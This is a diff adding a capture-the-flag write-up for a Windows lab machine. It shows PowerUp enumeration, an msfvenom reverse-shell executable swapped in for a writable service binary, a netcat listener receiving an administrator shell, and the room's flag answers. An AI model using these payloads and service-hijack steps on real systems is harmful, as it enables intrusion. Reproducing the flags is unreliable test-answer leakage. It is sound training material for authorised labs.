@@ -384,3 +384,390 @@ ERROR: operable program. Check the spelling of the name, or if a path was includ
 ERROR: again.
 ERROR: At line:1 char:1
 ERROR: + ..\PowerUp.ps1
+ERROR: + ~~~~~~~~~~~~~~
+ERROR:     + CategoryInfo          : ObjectNotFound: (..\PowerUp.ps1:String) [], CommandNotFoundException
+ERROR:     + FullyQualifiedErrorId : CommandNotFoundException
+ERROR: 
+PS > . .\PowerUp.ps1
+PS > Invoke-AllChecks
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
+                 Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
+                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
+CanRestart     : False
+Name           : AWSLiteAgent
+Check          : Unquoted Service Paths
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
+CanRestart     : False
+Name           : AWSLiteAgent
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
+                 Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
+                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
+                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName                     : AdvancedSystemCareService9
+Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
+CanRestart                      : True
+Name                            : AdvancedSystemCareService9
+Check                           : Modifiable Service Files
+
+ServiceName                     : IObitUnSvr
+Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
+CanRestart                      : False
+Name                            : IObitUnSvr
+Check                           : Modifiable Service Files
+
+ServiceName                     : LiveUpdateSvc
+Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
+CanRestart                      : False
+Name                            : LiveUpdateSvc
+Check                           : Modifiable Service Files
+```
+Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability? *AdvancedSystemCareService9*
+```text
+IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+```
+The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
+Use msfvenom to generate a reverse shell as an Windows executable.
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.
+Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead. *No answer needed*
+```text
+PS > ^C
+Terminate channel 3? [y/N]  n
+
+PS > ^Z
+Background channel 3? [y/N]  y
+```
+```text
+meterpreter > cd "C:\Program Files (x86)\IObit\"
+[-] Parse error: Unmatched quote: "cd \"C:\\Program Files (x86)\\IObit\\\""
+```
+```text
+meterpreter > cd 'C:\Program Files (x86)\IObit\'
+```
+```text
+meterpreter > dir
+Listing: C:\Program Files (x86)\IObit
+=====================================
+
+Mode           Size   Type  Last modified            Name
+----           ----   ----  -------------            ----
+040777/rwxrwx  32768  dir   2022-08-25 13:33:46 -04  Advanced SystemCare
+rwx                         00
+040777/rwxrwx  16384  dir   2019-09-27 01:35:24 -04  IObit Uninstaller
+rwx                         00
+040777/rwxrwx  4096   dir   2019-09-26 11:18:50 -04  LiveUpdate
+rwx                         00
+```
+```text
+meterpreter > upload Advanced.exe
+[*] uploading  : /home/kali/Downloads/steel_mountain/Advanced.exe -> Advanced.exe
+[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /home/kali/Downloads/steel_mountain/Advanced.exe -> Advanced.exe
+[*] uploaded   : /home/kali/Downloads/steel_mountain/Advanced.exe -> Advanced.exe
+```
+```text
+meterpreter > shell
+Process 4944 created.
+Channel 5 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
+sc stop AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
+sc start AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 5036
+        FLAGS              : 
+
+C:\Program Files (x86)\IObit>
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/steel_mountain]
+└─$ nc -nlvp 4443        
+listening on [any] 4443 ...
+connect to [10.11.81.220] from (UNKNOWN) [10.10.24.125] 49352
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cat 'c:\users\administrator\desktop\root.txt'
+cat 'c:\users\administrator\desktop\root.txt'
+'cat' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32>more 'c:\users\administrator\desktop\root.txt'
+more 'c:\users\administrator\desktop\root.txt'
+Cannot access file C:\Windows\system32\'c:\users\administrator\desktop\root.txt'
+
+C:\Windows\system32>cd 'c:\users\administrator\desktop\'
+cd 'c:\users\administrator\desktop\'
+The filename, directory name, or volume label syntax is incorrect.
+
+C:\Windows\system32>cd ..\..    
+cd ..\..
+```
+```text
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\
+
+10/12/2020  12:06 PM         3,162,859 EC2-Windows-Launch.zip
+09/26/2019  07:17 AM    <DIR>          inetpub
+10/12/2020  12:06 PM            13,182 install.ps1
+08/22/2013  08:52 AM    <DIR>          PerfLogs
+09/29/2019  05:42 PM    <DIR>          Program Files
+09/29/2019  05:46 PM    <DIR>          Program Files (x86)
+09/26/2019  11:29 PM    <DIR>          Users
+10/12/2020  12:09 PM    <DIR>          Windows
+               2 File(s)      3,176,041 bytes
+               6 Dir(s)  44,151,877,632 bytes free
+```
+```text
+C:\>cd Users
+cd Users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\Users
+
+09/26/2019  11:29 PM    <DIR>          .
+09/26/2019  11:29 PM    <DIR>          ..
+09/26/2019  07:11 AM    <DIR>          Administrator
+09/27/2019  09:09 AM    <DIR>          bill
+08/22/2013  08:39 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  44,151,877,632 bytes free
+
+C:\Users>cd Administrator
+cd Administrator
+
+C:\Users\Administrator>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\Users\Administrator
+
+09/26/2019  07:11 AM    <DIR>          .
+09/26/2019  07:11 AM    <DIR>          ..
+09/26/2019  07:11 AM    <DIR>          Contacts
+10/12/2020  12:05 PM    <DIR>          Desktop
+09/26/2019  07:11 AM    <DIR>          Documents
+09/27/2019  07:57 AM    <DIR>          Downloads
+09/26/2019  07:11 AM    <DIR>          Favorites
+09/26/2019  07:11 AM    <DIR>          Links
+09/26/2019  07:11 AM    <DIR>          Music
+09/26/2019  07:11 AM    <DIR>          Pictures
+09/26/2019  07:11 AM    <DIR>          Saved Games
+09/26/2019  07:11 AM    <DIR>          Searches
+09/26/2019  07:11 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)  44,151,877,632 bytes free
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\Users\Administrator\Desktop
+
+10/12/2020  12:05 PM    <DIR>          .
+10/12/2020  12:05 PM    <DIR>          ..
+10/12/2020  12:05 PM             1,528 activation.ps1
+09/27/2019  05:41 AM                32 root.txt
+               2 File(s)          1,560 bytes
+               2 Dir(s)  44,151,877,632 bytes free
+
+C:\Users\Administrator\Desktop>more root.txt
+more root.txt
+9af5f314f57607c00fd09803a587db80
+```
+### Access and Escalation Without Metasploit
+Now let's complete the room without the use of Metasploit.
+For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to
+Answer the questions below
+To begin we shall be using the same CVE. However, this time let's use this exploit.
+*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*
+To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from GitHub!
+You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!
+*No answer needed*
+Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c.
+Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.
+![](https://i.imgur.com/OyEdJ27.png)
+What powershell -c command could we run to manually find out the service name?
+*Format is "powershell -c "command here"*
+*powershell -c "Get-Service"*
+Now let's escalate to Administrator with our new found knowledge.
+Generate your payload using msfvenom and pull it to the system using powershell.
+Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.
+First we need to stop the service which we can do like so;
+sc stop AdvancedSystemCareService9
+Shortly followed by;
+sc start AdvancedSystemCareService9
+Once this command runs, you will see you gain a shell as Administrator on our listener!
+(msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP> LPORT=443 -e x86/shikata_ga_nai -f exe -o Advanced.exe)
+*No answer needed*
+
+## Flags / Answers
+- Use Metasploit to get an initial shell. What is the user flag? *b04763b6fcf51fcd7c13abc7db4fd365*
+- What is the root flag? *9af5f314f57607c00fd09803a587db80*
+
+## Notes / Lessons Learned
+[[Active Directory Basics(1)]]
+
